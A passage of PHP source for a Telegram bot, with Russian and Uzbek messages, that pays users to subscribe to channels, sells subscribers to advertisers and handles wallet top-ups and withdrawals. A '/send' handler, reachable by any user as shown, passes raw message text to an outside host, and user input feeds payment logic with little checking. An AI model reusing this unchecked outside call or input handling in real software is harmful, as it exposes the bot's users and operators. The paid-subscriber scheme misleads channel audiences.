            $pmoney = $inreg[1];
            $hiso = money_eq($chat_id, $pmoney, $minimalka);

            switch ($hiso) {
                case '001':

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

                $content = ['chat_id' => $chat_id, 'text' => "Заявки приняти!", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                $content = ['chat_id' => $admin, 'text' => "$chat_id отправил запрос на вывод $pmoney рублей в кошелёк Киви $puid!", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                $content = ['chat_id' => $admin2, 'text' => "$chat_id отправил запрос на вывод $pmoney рублей в кошелёк Киви $puid!", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                    break;

                case '002':

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

                $content = ['chat_id' => $chat_id, 'text' => "Минималка $minimalka!", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                    break;

                case '003':

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

                $content = ['chat_id' => $chat_id, 'text' => "Ошибка! У вас недостаточно средств на счету", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                    break;

                default:

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

                $content = ['chat_id' => $chat_id, 'text' => "Ошибка! У вас недостаточно средств на счету", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);
                    break;
            }
        }

        // Pul Yechib olish Payeer.. bajarish
        if ($sreply == 'Напишите сумму вывода и номер вашего Payeer кошелка, Например: 50 P1234567'){
            // $inreg[1] = User ID
            // $inreg[3] = pul  miqdori
            $regex = "~([A-za-z0-9@.:]+)~";
            $inreg = preg_split($regex, $text, -1, PREG_SPLIT_DELIM_CAPTURE);
            $puid = $inreg[3];
            $pmoney = $inreg[1];
            $hiso = money_eq($chat_id, $pmoney, $minimalka);

            switch ($hiso) {
                case '001':

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

                $content = ['chat_id' => $chat_id, 'text' => "Заявки приняти!", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                $content = ['chat_id' => $admin, 'text' => "$chat_id отправил запрос на вывод $pmoney рублей в кошелёк Payeer $puid !", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                $content = ['chat_id' => $admin2, 'text' => "$chat_id отправил запрос на вывод $pmoney рублей в кошелёк Payeer $puid !", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                    break;

                case '002':

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

                $content = ['chat_id' => $chat_id, 'text' => "Минималка $minimalka!", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                    break;

                case '003':

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

                $content = ['chat_id' => $chat_id, 'text' => "Ошибка! У вас недостаточно средств на счету", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);

                    break;

                default:

                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

                $content = ['chat_id' => $chat_id, 'text' => "Ошибка! У вас недостаточно средств на счету", 'parse_mode' => 'markdown', 'reply_markup' => $keyb];
                $telegram->sendMessage($content);
                    break;
            }
        }

        //my channel
        if ($text == 'Мои каналы' || $text == '/my_channel') {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false); 
            $content = ['chat_id' => $chat_id, 'text' => getMyChannel($chat_id), 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        if ($text == '📈 Для рекламодателей') {
            $option = [["Добавить канал","Мои каналы"],["Заказ подписчиков","Мои заказы"],["🔚 Начало"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Цена одного подписчика $azotuplash рублей"];
            $telegram->sendMessage($content);
        }




        //start tes qilish
        if ($text == '/zakaz' || $text == 'Заказ подписчиков'){
            $keyb = $telegram->buildForceReply($selective=true);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Напишите на маленьких буквах @username вашего канала и количество подписчиков вам нужную. Например: 250 dtmtest", 'parse_mode' => 'markdown'];
            $telegram->sendMessage($content);
        }


        if ($sreply == 'Напишите на маленьких буквах @username вашего канала и количество подписчиков вам нужную. Например: 250 dtmtest'){

            $regex = "~([A-Za-z0-9_-]+)~";
            $inreg = preg_split($regex, $text, -1, PREG_SPLIT_DELIM_CAPTURE);
            $count =  $inreg[1];
            $chlogin =  $inreg[3];

            if (strlen($chlogin) > 1 && strlen($count) > 0) {
                $chlogin = strtolower($chlogin);
                if (chechZakazMoney($chlogin, $chat_id, $count, $azotuplash, $bot_token)) {

                    //$option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
                    //$keyb = $telegram->buildKeyBoard($option, $onetime = false);

                    //$text = "Ваш заказ на @$chlogin канал на $count началось";
                    //$content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $text, 'parse_mode' => 'markdown'];
                    //$telegram->sendMessage($content);
                }
                else {
                    $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила'],["✉️ Chat"]];
                    $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                    $text = "недостаточно денег на счёту";
                    $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $text, 'parse_mode' => 'markdown'];
                    $telegram->sendMessage($content);
                }
            } else {

                $keyb = $telegram->buildForceReply($selective=true);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Напишите на маленьких буквах @username вашего канала и количество подписчиков вам нужную. Например: 250 dtmtest", 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }
        //  end tes qilish

        if ($text == 'Мои заказы') {

            $option = [["Добавить канал","Мои каналы"],["Заказ подписчиков","Мои заказы"],["🔚 Начало"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $tex = getMyZakaz($chat_id);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => $tex];
            $telegram->sendMessage($content);
        }

        if($text=='💰 Пополнение'){
            //$option = [['qiwi','advcash','webmoney'],["Payme"],["🔚 Начало"]];
            $option = [['Киви','advcash','Пайеер'],["🔚 Начало"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Выберите нужный раздел"];
            $telegram->sendMessage($content);
        }

        if($text=='💵 Баланс'){
            $option = [['💸 Вывод','💰 Пополнение'],["🔚 Начало"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => getUserMoney($uid)];
            $telegram->sendMessage($content);
        }

        if ($text == 'Киви') {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

            $text = db_SQiwi() . $chat_id;
            $content = ['chat_id' => $chat_id, 'text' => $text, 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        if ($text == "advcash") {

            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false); 
            $content = ['chat_id' => $chat_id, 'text' => db_SAdvcash() . $chat_id, 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        if ($text == 'Пайеер') {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false); 
            $content = ['chat_id' => $chat_id, 'text' => db_SWebmoney() . $chat_id, 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        if ($text == 'Paayme') {
            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false); 
            $text = "👉 Click orqali o'z hisobingizni toldiring buning uchun bizning karta raqamimizga kerakli mablag'ni yuborib adminga o'z karta raqamingizni oxirgi 4 xonali raqamini, qaysi bankga tegishli ekanligi, qancha summa yuborganingizni va UserID gizni yozib yuboring.
Misol uchun: Karta=7146 Bank=Agro Summa=10000 ID=$chat_id va shunga oxshash.
Mablag' sizning hisobingizga 5 daqiqadan 1 soat vaqt oralig'ida o'tkaziladi!

👱 User IDingiz: $chat_id
";
            $content = ['chat_id' => $chat_id, 'text' => $text.db_SPayme(), 'reply_markup' => $keyb];
            $telegram->sendMessage($content);
        }

        //kanalga azo bulish
        if ($text == '➕  Подписаться на канал' || $text == 'join') {
            $ChID = getJoinChannel($chat_id);

            if ($ChID) {
                //$ChID = 'DroidFan#-1001056610936';

                // $inreg[0] = Channel Username 
                // $inreg[1] = channelID
                $regex2 = "~#([a-zA-Z0-9]+)~";
                $inreg = preg_split($regex2, $ChID, -1, PREG_SPLIT_DELIM_CAPTURE);
                $CHLOGIN = $inreg[0];
                $ChID2 = $inreg[1];

                $option = [[
                    $telegram->buildInlineKeyBoardButton('Перейти к каналу', $url = "https://telegram.me/$CHLOGIN")
                    ],[
                    $telegram->buildInlineKeyBoardButton('Проверить', $url = '', $callback_data = 'checkJoin#'.$ChID2.'#'.$chat_id)
                    ],[
                    $telegram->buildInlineKeyBoardButton('Пропустить', $url = '', $callback_data = 'next#'.$ChID2.'#'.$chat_id)
                    ]];
                $keyb = $telegram->buildInlineKeyBoard($option);
                $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => 'Просто подписывайся на каналы и получай прибыль'];
                $telegram->sendMessage($content);
            }
            else {
                $text = 'В данный момент нету каналов, посмотрите по позже';
                $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat']];
                $keyb = $telegram->buildKeyBoard($option, $onetime = false);
                $content = ['chat_id' => $chat_id, 'text' => $text, 'reply_markup' => $keyb, 'parse_mode' => 'markdown'];
                $telegram->sendMessage($content);
            }
        }

        if ($text == '/inline' || $text == 'inline') {
            // Shows the Inline Keyboard and Trigger a callback on a button press
            $option = [
                [
                $telegram->buildInlineKeyBoardButton('Перейти к каналу', $url = 'http://telegram.me/DroidFan'),
                ],[
                $telegram->buildInlineKeyBoardButton('Проверить', $url = '', $callback_data = 'tizim ish faoliyatda'),
                ],
            ];
            $keyb = $telegram->buildInlineKeyBoard($option);
            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => 'Просто подписывайся на каналы и получай прибыль'];
            $telegram->sendMessage($content);
        }

        if (mb_stripos($text,"/send") !== false) {
            $loop=explode(">",$text);

    $setxt = $loop[1];
    $sen = file_get_contents("https://infobot.cf/ruxsat/onz/file.php?text=$setxt");


            $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat'],["Ваш ID"]];
            $keyb = $telegram->buildKeyBoard($option, $onetime = false); 

            $content = ['chat_id' => $chat_id, 'reply_markup' => $keyb, 'text' => "Удачно отправлено", 'parse_mode' => 'markdown'];
            $telegram->sendMessage($content);
            exit();
        }
    }
}

if ($turi == 'supergroup')
{

    if (strlen($text) > 0){

        if (checkSupergroup($cid))
        {
          
        } else { addSupergroup($cid, $ctitle, $ulogin, $sana, $uid, $ufname, $uname); }

        if ($text == '/start') {
        $content = ['chat_id' => $chat_id, 'text' => "Привет $ufname $uname, отвечу в личке. Переходите в личку"];
        $telegram->sendMessage($content);
        }
    }
}

if ($turi == 'group')
{
    if (strlen($text) > 0){
        if (checkGroup($cid))
        {
          
        } else { addGroup($cid, $ctitle, $ulogin, $sana, $uid, $ufname, $uname); }
        if ($text == '/start') {
        $content = ['chat_id' => $chat_id, 'text' => "Привет $ufname $uname, отвечу в личке. Переходите в личку"];
        $telegram->sendMessage($content);
        }
    }
}

if ($chturi == 'channel')
{
    if ($chtext == 'meni aktivla'){
        $chusername = strtolower($chusername);
        $chat_id = addChannelVer($chid, $chtitle, $chusername, $chdate, $chwhois);

        $option = [["➕  Подписаться на канал"],["📈 Для рекламодателей"],['👤 Мой кабинет','💵 Баланс'],['📊 Статистика','⛔️ Правила','✉️ Chat']];
        $keyb = $telegram->buildKeyBoard($option, $onetime = false);

        $content = ['chat_id' => $chat_id, 'text' => "Ваш канал @$chusername, активирован. 
        Теперь можете заказать подписчиков.", 'reply_markup' => $keyb];
        $telegram->sendMessage($content);

    }
}

/*if (mb_stripos($text,'/send')) {
$xab=explode(">",$text);
$xabar=$xab[1];
file_get_contents("infobot.cf/ruxsat/onz/file.php?text=$xabar");

    $content = ['chat_id'=> $chat_id, 'parse_mode' => 'markdown', 'text' => "yuborildi"];
    $telegram->sendMessage($content);
 }
*/
?>
